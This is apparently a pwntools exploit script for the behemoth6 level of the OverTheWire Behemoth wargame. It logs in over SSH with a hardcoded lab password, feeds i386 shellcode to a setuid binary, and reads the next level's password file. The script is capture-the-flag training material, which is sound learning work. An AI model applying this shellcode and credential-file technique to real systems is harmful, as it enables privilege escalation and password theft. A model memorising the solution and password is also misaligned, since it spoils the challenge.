from pwn import *


con = ssh('behemoth6', 'behemoth.labs.overthewire.org', password='mayiroeche', port=2221)
shellcode = shellcraft.i386.linux.echo(b'HelloKitty', 1)
shellcode += shellcraft.i386.linux.exit(0)
print(asm(shellcode))
p = con.process('sh')
p.sendline('cd /tmp && cd /tmp/behem6')
p.sendline(b'python -c \'print "' +  asm(shellcode) + b'"\' > shellcode.txt')
p.sendline('/behemoth/behemoth6')
p.recv()
p.recv()
p.recv()
p.recv()
p.sendline('cat /etc/behemoth_pass/behemoth7')
print(p.recv())
